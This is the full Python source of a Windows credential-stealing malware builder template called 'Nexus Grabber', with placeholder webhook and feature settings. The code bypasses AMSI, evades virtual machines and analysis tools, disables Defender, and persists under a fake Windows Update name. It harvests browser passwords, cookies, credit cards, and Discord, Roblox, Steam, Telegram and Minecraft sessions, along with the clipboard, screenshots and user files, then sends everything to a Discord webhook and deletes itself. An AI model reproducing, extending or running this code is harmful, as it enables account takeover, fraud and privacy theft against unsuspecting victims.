import os, sys, re, json, sqlite3, base64, shutil, tempfile, time, subprocess, threading, glob, win32crypt, ctypes, gc
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests
import win32clipboard
from PIL import ImageGrab
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import zipfile

import win32event, win32api, winerror, win32crypt, win32clipboard, pywintypes

try:
    import minecraft_launcher_lib
    MINECRAFT_AVAILABLE = True
except ImportError:
    MINECRAFT_AVAILABLE = False

# ================== AMSI BYPASS ==================
try:
    kernel32 = ctypes.windll.kernel32
    amsi = ctypes.windll.amsi
    if amsi:
        patch = bytes([0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3])
        addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
        old_protect = ctypes.c_uint32(0)
        kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
        ctypes.memmove(addr, patch, len(patch))
except:
    pass

# ================== CONFIGURATION ==================
WEBHOOK = "{WEBHOOK}"
TELEGRAM_TOKEN = "{TELEGRAM_TOKEN}"
TELEGRAM_CHAT_ID = "{TELEGRAM_CHAT_ID}"
ENCRYPT_DATA = "{ENCRYPT_DATA}"
ZIP_PASSWORD = "{ZIP_PASSWORD}"
PING_ALL = "{PING_ALL}"
AES_KEY_B64 = "{AES_KEY}"
AES_KEY = base64.b64decode(AES_KEY_B64) if AES_KEY_B64 else b""

SCREENSHOT = "{SCREENSHOT}"
CLIPBOARD = "{CLIPBOARD}"
WEBCAM = "{WEBCAM}"
KEYLOGGER = "{KEYLOGGER}"
DISCORD_TOKENS = "{DISCORD_TOKENS}"
DISCORD_FILES = "{DISCORD_FILES}"
BROWSER_PASSWORDS = "{BROWSER_PASSWORDS}"
COOKIES = "{BROWSER_PASSWORDS}"
AUTOFILL = "{AUTOFILL}"
WIFI_PASSWORDS = "{WIFI_PASSWORDS}"
STEAM_CONFIG = "{STEAM_CONFIG}"
MINECRAFT_TOKENS = "{MINECRAFT_TOKENS}"
TELEGRAM_SESSION = "{TELEGRAM_SESSION}"
FILE_GRABBER = "{FILE_GRABBER}"
LOG_IP = "{LOG_IP}"
STARTUP = "{STARTUP}"
SELF_REMOVE = "{SELF_REMOVE}"
ANTI_VM = "{ANTI_VM}"
ANTI_ANALYSIS = "{ANTI_ANALYSIS}"
MUTEX = "{MUTEX}"
DISABLE_DEFENDER = "{DISABLE_DEFENDER}"
WAIT_FOR_MOUSE = "{WAIT_FOR_MOUSE}"
DECOY_FILE = "{DECOY_FILE}"
FILE_EXTS = "{FILE_EXTENSIONS}"
GRAB_FOLDERS = "{GRAB_FOLDERS}"
ROBLOX_COOKIES = "{ROBLOX_COOKIES}"

ROAMING = os.environ['APPDATA']
LOCAL = os.environ['LOCALAPPDATA']

# ================== ANTI-VM / EVASION ==================
if WAIT_FOR_MOUSE:
    user32 = ctypes.windll.user32
    pt = ctypes.wintypes.POINT()
    user32.GetCursorPos(ctypes.byref(pt))
    sx, sy = pt.x, pt.y
    moved = 0
    while moved < 500:
        user32.GetCursorPos(ctypes.byref(pt))
        moved = abs(pt.x - sx) + abs(pt.y - sy)
        time.sleep(0.1)

if ANTI_VM:
    def is_vm():
        for d in ['vmware','vbox','virtualbox','qemu','hyper-v']:
            if os.path.exists(f"C:\\Windows\\System32\\drivers\\{d}.sys"): return True
        if os.cpu_count() <= 2: return True
        try:
            import uuid
            mac = hex(uuid.getnode())[2:].upper()
            vm_macs = ['000C29','000569','001C42','005056','080027']
            if any(mac.startswith(v) for v in vm_macs): return True
        except: pass
        return False
    if is_vm(): sys.exit(0)

if ANTI_ANALYSIS:
    bad = ['wireshark','procexp','procmon','ida','ollydbg','x64dbg','tcpview','fiddler']
    try:
        output = subprocess.run('tasklist', shell=True, capture_output=True, text=True).stdout.lower()
        for proc in bad:
            if proc in output: sys.exit(0)
    except: pass

if MUTEX:
    import win32event, win32api, winerror
    mutex = win32event.CreateMutex(None, False, "NexusGrabber_Mutex")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS: sys.exit(0)

if DISABLE_DEFENDER:
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        key.Close()
    except:
        subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \"{sys.argv[0]}\""', shell=True, capture_output=True)

if STARTUP:
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
        key.Close()
    except:
        subprocess.run(f'schtasks /create /tn "WindowsUpdateTask" /tr "{sys.executable} {sys.argv[0]}" /sc onlogon /f', shell=True, capture_output=True)

if DECOY_FILE and os.path.exists(DECOY_FILE):
    os.startfile(DECOY_FILE)

# ================== SAFE TEMP FILE HELPERS ==================
def safe_copy_db(src_path):
    fd, temp_path = tempfile.mkstemp(suffix='.db')
    os.close(fd)
    try:
        shutil.copy2(src_path, temp_path)
        return temp_path
    except Exception:
        os.unlink(temp_path)
        raise

def safe_unlink(path, max_retries=5, delay=0.2):
    for attempt in range(max_retries):
        try:
            gc.collect()
            os.unlink(path)
            return
        except OSError:
            if attempt == max_retries - 1:
                raise
            time.sleep(delay)

# ================== MASTER KEY & PROFILES ==================
def get_master_key(browser_path):
    local_state = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state):
        return None, None
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            data = json.load(f)
        if 'app_bound_encrypted_key' in data['os_crypt']:
            return None, 'v20'
        encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key, 'v10/v11'
    except:
        return None, None

def get_profiles(browser_path):
    profiles = ['Default']
    for i in range(1, 20):
        p = os.path.join(browser_path, f'Profile {i}')
        if os.path.exists(p):
            profiles.append(f'Profile {i}')
        else:
            break
    return profiles

# ================== ENCRYPTION & SEND HELPERS ==================
def encrypt_data(data):
    if not ENCRYPT_DATA or not AES_KEY: return data
    iv = os.urandom(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(pad(data.encode(), AES.block_size))).decode()

def send_embed(title, desc, color=0x00ccff):
    if not WEBHOOK: return
    if not desc: desc = "No data"
    if len(desc) > 4096: desc = desc[:4093] + "..."
    if "\n" in desc or len(desc) > 80:
        desc = f"```\n{desc}\n```"
    embed = {
        "title": title, "description": desc, "color": color,
        "footer": {"text": "Nexus Grabber • Data stolen from this machine"},
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    }
    payload = {"embeds": [embed]}
    if PING_ALL and title == "Nexus Grabber":
        payload["content"] = "@everyone"
    try:
        if ENCRYPT_DATA:
            plain = f"**{title}**\n{desc}"
            if PING_ALL and title == "Nexus Grabber":
                plain = "@everyone " + plain
            encrypted = encrypt_data(plain)
            requests.post(WEBHOOK, json={"content": encrypted}, timeout=10)
        else:
            requests.post(WEBHOOK, json=payload, timeout=10)
    except:
        pass

def send_file(path, caption=""):
    if not os.path.exists(path): return
    with open(path, 'rb') as f:
        files = {'file': (os.path.basename(path), f)}
        try:
            requests.post(WEBHOOK, files=files, data={'content': caption}, timeout=20)
        except:
            pass
    try:
        os.unlink(path)
    except:
        pass

# ================== BROWSER PATHS (full list) ==================
BROWSER_PATHS = {
    "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),
    "Torch": os.path.join(LOCAL, "Torch", "User Data"),
    "Kometa": os.path.join(LOCAL, "Kometa", "User Data"),
    "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),
    "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),
    "7Star": os.path.join(LOCAL, "7Star", "7Star", "User Data"),
    "Sputnik": os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data"),
    "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
    "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),
    "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
    "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),
    "Microsoft Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
    "Uran": os.path.join(LOCAL, "uCozMedia", "Uran", "User Data"),
    "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
    "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
    "Iridium": os.path.join(LOCAL, "Iridium", "User Data"),
    "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
    "Opera GX": os.path.join(LOCAL, "Opera Software", "Opera GX Stable"),
    "Opera GX Alt": os.path.join(LOCAL, "Opera Software", "Opera GX"),
    "Chromium": os.path.join(LOCAL, "Chromium", "User Data"),
    "Brave-Beta": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser-Beta", "User Data"),
    "Brave-Nightly": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser-Nightly", "User Data"),
    "Edge Beta": os.path.join(LOCAL, "Microsoft", "Edge Beta", "User Data"),
    "Edge Dev": os.path.join(LOCAL, "Microsoft", "Edge Dev", "User Data"),
    "Edge Canary": os.path.join(LOCAL, "Microsoft", "Edge SxS", "User Data"),
    "Chrome Beta": os.path.join(LOCAL, "Google", "Chrome Beta", "User Data"),
    "Chrome Dev": os.path.join(LOCAL, "Google", "Chrome Dev", "User Data"),
    "Chrome Canary": os.path.join(LOCAL, "Google", "Chrome Canary", "User Data"),
    "Opera Beta": os.path.join(ROAMING, "Opera Software", "Opera Beta", "User Data"),
    "Opera Developer": os.path.join(ROAMING, "Opera Software", "Opera Developer", "User Data"),
    "Vivaldi Snapshot": os.path.join(LOCAL, "Vivaldi", "Vivaldi Snapshot", "User Data"),
}

def get_profile_path(name, base):
    if "Opera" in name:
        return base
    return os.path.join(base, "Default")

def get_cookie_db_path(profile):
    net = os.path.join(profile, "Network", "Cookies")
    if os.path.exists(net): return net
    legacy = os.path.join(profile, "Cookies")
    return legacy if os.path.exists(legacy) else None

def get_master_key_legacy(path):
    ls = os.path.join(path, "Local State")
    if not os.path.exists(ls): return None
    try:
        with open(ls,'r') as f: local = json.load(f)
        enc = base64.b64decode(local['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except: return None

def decrypt_value(buffer, key=None):
    if not isinstance(buffer, bytes) or len(buffer) < 3: return None
    prefix = buffer[:3].decode()
    if prefix in ("v10", "v11"):
        if not key: return None
        try:
            nonce = buffer[3:15]
            ct = buffer[15:-16]
            tag = buffer[-16:]
            return AESGCM(key).decrypt(nonce, ct + tag, None).decode()
        except: return None
    else:
        try:
            return win32crypt.CryptUnprotectData(buffer, None, None, None, 0)[1].decode()
        except: return None

# ================== DISCORD TOKEN STEALER ==================
def steal_discord_tokens():
    from Crypto.Cipher import AES
    import urllib.request
    import datetime

    checked = []
    valid_tokens = []
    roaming = os.environ['APPDATA']
    local = os.environ['LOCALAPPDATA']

    PATHS = {
        'Discord': os.path.join(roaming, 'discord'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Discord PTB': os.path.join(roaming, 'discordptb'),
        'Lightcord': os.path.join(roaming, 'Lightcord'),
    }

    def getheaders(token=None):
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if token:
            headers.update({"Authorization": token})
        return headers

    def getkey(path):
        with open(os.path.join(path, "Local State"), "r") as f:
            return json.load(f)['os_crypt']['encrypted_key']

    def gettokens(path):
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        tokens = []
        if not os.path.exists(leveldb_path):
            return tokens
        for file in os.listdir(leveldb_path):
            if not file.endswith((".ldb", ".log")):
                continue
            try:
                with open(os.path.join(leveldb_path, file), "r", errors="ignore") as f:
                    for line in f:
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except:
                continue
        return tokens

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for enc_token in gettokens(path):
            enc_token = enc_token.replace("\\", "") if enc_token.endswith("\\") else enc_token
            try:
                master_key = win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1]
                decoded = base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1])
                nonce = decoded[3:15]
                ciphertext = decoded[15:-16]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                token = cipher.decrypt(ciphertext).decode()
                if token in checked:
                    continue
                checked.append(token)

                try:
                    req = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                    if req.getcode() != 200:
                        continue
                    user_data = json.loads(req.read().decode())
                    guild_count = 0
                    try:
                        guilds_req = urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/guilds', headers=getheaders(token)))
                        guilds = json.loads(guilds_req.read().decode())
                        guild_count = len(guilds)
                    except:
                        pass
                    has_nitro = False
                    exp_date = None
                    try:
                        sub_req = urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)))
                        subs = json.loads(sub_req.read().decode())
                        has_nitro = len(subs) > 0
                        if has_nitro:
                            exp_date = datetime.datetime.strptime(subs[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
                    except:
                        pass
                    token_info = f"{platform} | {user_data['username']}#{user_data.get('discriminator', '0')} | {token}"
                    if has_nitro:
                        token_info += f" | NITRO until {exp_date}"
                    valid_tokens.append(token_info)
                except:
                    continue
            except:
                continue
    return valid_tokens[:30]

# ================== ROBLOX COOKIE (three methods) ==================
def steal_roblox_cookie():
    # ------------------------------------------------------------
    # Method 1: Browser cookie databases (DPAPI + AES‑GCM)
    # ------------------------------------------------------------
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    browser_paths = BROWSER_PATHS
    for name, base_path in browser_paths.items():
        if not os.path.exists(base_path):
            continue
        master_key, _ = get_master_key(base_path)
        if not master_key:
            continue
        for profile in get_profiles(base_path):
            cookie_db = os.path.join(base_path, profile, 'Network', 'Cookies')
            if not os.path.exists(cookie_db):
                cookie_db = os.path.join(base_path, profile, 'Cookies')
            if not os.path.exists(cookie_db):
                continue
            temp_db = None
            conn = None
            try:
                temp_db = safe_copy_db(cookie_db)
                conn = sqlite3.connect(temp_db)
                cur = conn.cursor()
                cur.execute("SELECT encrypted_value FROM cookies WHERE name = '.ROBLOSECURITY'")
                row = cur.fetchone()
                if row and row[0]:
                    enc = row[0]
                    if enc[:3] in (b'v10', b'v11'):
                        nonce = enc[3:15]
                        ct = enc[15:-16]
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        cookie = cipher.decrypt(ct).decode('utf-8', errors='ignore')
                        if cookie.startswith('_|WARNING:'):
                            return cookie, f"Browser DB | {name} | {profile}"
            except:
                pass
            finally:
                if conn:
                    conn.close()
                if temp_db:
                    try:
                        safe_unlink(temp_db)
                    except:
                        pass

    # ------------------------------------------------------------
    # Method 2: browser_cookie3 (optional)
    # ------------------------------------------------------------
    try:
        import browser_cookie3
        for browser_func in [browser_cookie3.chrome, browser_cookie3.edge, browser_cookie3.firefox, browser_cookie3.opera, browser_cookie3.brave]:
            try:
                cj = browser_func(domain_name="roblox.com")
                for cookie in cj:
                    if cookie.name == ".ROBLOSECURITY":
                        return cookie.value, f"browser_cookie3 | {browser_func.__name__.split('.')[-1]}"
            except:
                continue
    except ImportError:
        pass

    # ------------------------------------------------------------
    # Method 3: Roblox local storage file (robloxcookies.dat)
    # ------------------------------------------------------------
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_file = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    if os.path.exists(roblox_cookies_file):
        temp_dir = os.getenv("TEMP", "")
        dest = os.path.join(temp_dir, "RobloxCookies.dat")
        try:
            shutil.copy(roblox_cookies_file, dest)
            with open(dest, 'r', encoding='utf-8') as f:
                data = json.load(f)
                encoded_cookies = data.get("CookiesData", "")
                if encoded_cookies:
                    decoded = base64.b64decode(encoded_cookies)
                    try:
                        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
                        cookie = decrypted.decode('utf-8', errors='ignore')
                        if cookie.startswith('_|WARNING:'):
                            return cookie, "Roblox local storage (robloxcookies.dat)"
                    except Exception:
                        pass
        except:
            pass
        finally:
            try:
                os.unlink(dest)
            except:
                pass

    return None, "No .ROBLOSECURITY cookie found"

# ================== BROWSER PASSWORDS (full list) ==================
def steal_browser_passwords():
    passwords = []
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    browser_paths = BROWSER_PATHS
    def decrypt_password(encrypted, key):
        if encrypted[:3] in (b'v10', b'v11'):
            nonce = encrypted[3:15]
            ct = encrypted[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt(ct).decode('utf-8', errors='ignore')
        return None
    for name, base_path in browser_paths.items():
        if not os.path.exists(base_path):
            continue
        master_key, _ = get_master_key(base_path)
        if not master_key:
            continue
        for profile in get_profiles(base_path):
            login_db = os.path.join(base_path, profile, 'Login Data')
            if not os.path.exists(login_db):
                continue
            temp_db = None
            conn = None
            try:
                temp_db = safe_copy_db(login_db)
                conn = sqlite3.connect(temp_db)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cur.fetchall()
                for url, user, enc in rows:
                    if url and user and enc and isinstance(enc, bytes):
                        dec = decrypt_password(enc, master_key)
                        if dec:
                            passwords.append(f"{name} | {profile} | {url} | {user} : {dec}")
            except:
                pass
            finally:
                if conn:
                    conn.close()
                if temp_db:
                    try:
                        safe_unlink(temp_db)
                    except:
                        pass
    return passwords[:200]

# ================== BROWSER AUTOFILL (full list) ==================
def steal_autofill():
    autofill = []
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    browser_paths = BROWSER_PATHS
    def decrypt_autofill(encrypted, key):
        if encrypted[:3] in (b'v10', b'v11'):
            nonce = encrypted[3:15]
            ct = encrypted[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt(ct).decode('utf-8', errors='ignore')
        return None
    for name, base_path in browser_paths.items():
        if not os.path.exists(base_path):
            continue
        master_key, _ = get_master_key(base_path)
        if not master_key:
            continue
        for profile in get_profiles(base_path):
            web_data = os.path.join(base_path, profile, 'Web Data')
            if not os.path.exists(web_data):
                continue
            temp_db = None
            conn = None
            try:
                temp_db = safe_copy_db(web_data)
                conn = sqlite3.connect(temp_db)
                cur = conn.cursor()
                # Credit cards
                cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for row in cur.fetchall():
                    name, exp_month, exp_year, enc = row
                    if enc and isinstance(enc, bytes):
                        dec = decrypt_autofill(enc, master_key)
                        if dec:
                            autofill.append(f"{name} | {profile} | Card: {name} ({exp_month}/{exp_year}) | {dec[:20]}")
                # Addresses
                cur.execute("SELECT street_address, city, state, zipcode FROM autofill_profile_addresses")
                for row in cur.fetchall():
                    if any(row):
                        addr = ', '.join(str(x) for x in row if x)
                        autofill.append(f"{name} | {profile} | Address: {addr}")
            except:
                pass
            finally:
                if conn:
                    conn.close()
                if temp_db:
                    try:
                        safe_unlink(temp_db)
                    except:
                        pass
    return autofill[:100]

# ================== GENERAL COOKIES (legacy) ==================
def steal_cookies():
    all_cookies = []
    for name, user_data in BROWSER_PATHS.items():
        if not os.path.exists(user_data):
            continue
        profile = get_profile_path(name, user_data)
        if not os.path.exists(profile):
            continue
        master = get_master_key_legacy(user_data)
        if not master:
            continue
        cookie_db = get_cookie_db_path(profile)
        if not cookie_db:
            continue
        temp_db = None
        conn = None
        try:
            temp_db = safe_copy_db(cookie_db)
            conn = sqlite3.connect(temp_db)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 500")
            rows = cur.fetchall()
            for host, n, val in rows:
                if isinstance(val, bytes):
                    dec = decrypt_value(val, master)
                    if dec:
                        all_cookies.append(f"{name} | {host} | {n} = {dec[:100]}")
        except:
            pass
        finally:
            if conn:
                conn.close()
            if temp_db:
                try:
                    safe_unlink(temp_db)
                except:
                    pass
    return all_cookies

# ================== MINECRAFT TOKEN STEALER ==================
def steal_minecraft_tokens():
    if not MINECRAFT_AVAILABLE:
        return None
    try:
        login_data = minecraft_launcher_lib.microsoft_account.complete_login(
            minecraft_launcher_lib.microsoft_account.get_login_url()
        )
        return {
            "access_token": login_data.get("access_token"),
            "refresh_token": login_data.get("refresh_token"),
            "username": login_data.get("name"),
            "uuid": login_data.get("uuid"),
        }
    except:
        return None

# ================== STEAM CONFIG + SSFN ==================
def steal_steam():
    steam_path = os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)') + '\\Steam'
    if not os.path.exists(steam_path):
        return False
    config_vdf = os.path.join(steam_path, 'config', 'config.vdf')
    loginusers_vdf = os.path.join(steam_path, 'config', 'loginusers.vdf')
    ssfn_files = glob.glob(os.path.join(steam_path, 'ssfn*'))
    files = []
    if os.path.exists(config_vdf):
        files.append(config_vdf)
    if os.path.exists(loginusers_vdf):
        files.append(loginusers_vdf)
    files.extend(ssfn_files)
    if not files:
        return False
    zip_path = tempfile.mktemp(suffix='.zip')
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in files:
                zf.write(f, arcname=os.path.basename(f))
        send_file(zip_path, "Steam config + SSFN")
        return True
    except:
        return False
    finally:
        if os.path.exists(zip_path):
            try:
                os.unlink(zip_path)
            except:
                pass

# ================== TELEGRAM SESSION ==================
def steal_telegram():
    tdata = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
    if not os.path.exists(tdata):
        return False
    has_files = False
    for root, _, files in os.walk(tdata):
        if files:
            has_files = True
            break
    if not has_files:
        return False
    zip_path = tempfile.mktemp(suffix='.zip')
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(tdata):
                for f in files:
                    full = os.path.join(root, f)
                    arc = os.path.relpath(full, os.path.dirname(tdata))
                    zf.write(full, arcname=arc)
        send_file(zip_path, "Telegram session data")
        return True
    except:
        return False
    finally:
        if os.path.exists(zip_path):
            try:
                os.unlink(zip_path)
            except:
                pass

# ================== OTHER FUNCTIONS ==================
def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return 'Unknown'

def take_screenshot():
    try:
        img = ImageGrab.grab()
        tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
        img.save(tmp.name, "JPEG", quality=60, optimize=True)
        tmp.close()
        send_file(tmp.name, "Screenshot")
        os.unlink(tmp.name)
    except:
        pass

def grab_files_to_zip():
    folders = []
    for f in GRAB_FOLDERS:
        if f == "Desktop":
            folder = os.path.join(os.environ['USERPROFILE'], 'Desktop')
        elif f == "Documents":
            folder = os.path.join(os.environ['USERPROFILE'], 'Documents')
        elif f == "Downloads":
            folder = os.path.join(os.environ['USERPROFILE'], 'Downloads')
        else:
            folder = f
        if os.path.exists(folder):
            folders.append(folder)
    if not folders:
        return None
    collected = []
    exts = [e.lower() for e in FILE_EXTS]
    skip = ['AppData','Windows','ProgramData','$Recycle.Bin','System Volume Information']
    for base in folders:
        for root, _, files in os.walk(base):
            if any(s in root for s in skip):
                continue
            depth = root[len(base):].count(os.sep)
            if depth > 1:
                continue
            for file in files:
                if any(file.lower().endswith(e) for e in exts):
                    full = os.path.join(root, file)
                    try:
                        if os.path.getsize(full) < 20*1024*1024:
                            collected.append(full)
                    except:
                        pass
    if not collected:
        return None
    zip_path = os.path.join(tempfile.gettempdir(), "stolen_files.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in collected[:100]:
                try:
                    zf.write(f, arcname=os.path.basename(f))
                except:
                    pass
    except:
        return None
    seven_zip = r"C:\Program Files\7-Zip\7z.exe"
    if os.path.exists(seven_zip) and ZIP_PASSWORD:
        pwd = zip_path.replace('.zip', '_pwd.zip')
        subprocess.run([seven_zip, 'a', f'-p{ZIP_PASSWORD}', pwd, zip_path], capture_output=True)
        return pwd
    return zip_path

def self_remove():
    try:
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsUpdate")
            key.Close()
        except:
            pass
        subprocess.run('schtasks /delete /tn "WindowsUpdateTask" /f', shell=True, capture_output=True)
        exe = sys.argv[0]
        if exe.endswith('.exe'):
            batch = tempfile.NamedTemporaryFile(suffix='.bat', delete=False)
            batch.write(f'@echo off\ntimeout /t 2 /nobreak > nul\ndel "{exe}"\ndel "%~f0"\n'.encode())
            batch.close()
            subprocess.Popen([batch.name], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

# ================== MAIN ==================
if __name__ == "__main__":
    send_embed("Nexus Grabber", "Payload executed successfully", color=0x00ccff)

    if LOG_IP:
        ip = get_ip()
        send_embed("Public IP", ip, color=0x3498db)

    if CLIPBOARD:
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()
                if data:
                    send_embed("Clipboard", data[:1000], color=0xf1c40f)
        except:
            pass

    if SCREENSHOT:
        take_screenshot()

    if DISCORD_TOKENS:
        tokens = steal_discord_tokens()
        if tokens:
            send_embed("Discord Tokens", "\n".join(tokens), color=0x5865F2)
        else:
            send_embed("Discord Tokens", "None found", color=0x5865F2)

    if BROWSER_PASSWORDS:
        pws = steal_browser_passwords()
        if pws:
            send_embed("Browser Passwords", "\n".join(pws), color=0xe74c3c)
        else:
            send_embed("Browser Passwords", "None found", color=0xe74c3c)

    if AUTOFILL:
        af = steal_autofill()
        if af:
            send_embed("Autofill Data", "\n".join(af), color=0xf39c12)
        else:
            send_embed("Autofill Data", "None found", color=0xf39c12)

    if COOKIES:
        cks = steal_cookies()
        if cks:
            send_embed("Browser Cookies", "\n".join(cks[:20]), color=0x95a5a6)
        else:
            send_embed("Browser Cookies", "None found", color=0x95a5a6)

    if ROBLOX_COOKIES:
        roblox_cookie, source = steal_roblox_cookie()
        if roblox_cookie:
            send_embed("Roblox Cookie", f"Source: {source}\n```\n{roblox_cookie}\n```", color=0xee2b47)
        else:
            send_embed("Roblox Cookie", f"Failed: {source}", color=0xee2b47)

    if MINECRAFT_TOKENS:
        mc = steal_minecraft_tokens()
        if mc:
            send_embed("Minecraft Tokens", f"Username: {mc.get('username', '?')}\nUUID: {mc.get('uuid', '?')}\nAccess Token: {mc.get('access_token', '')[:50]}...", color=0x00aa00)

    if STEAM_CONFIG:
        steal_steam()

    if TELEGRAM_SESSION:
        steal_telegram()

    if FILE_GRABBER:
        zipf = grab_files_to_zip()
        if zipf and os.path.exists(zipf):
            send_file(zipf, "Grabbed Files")

    if SELF_REMOVE:
        self_remove()
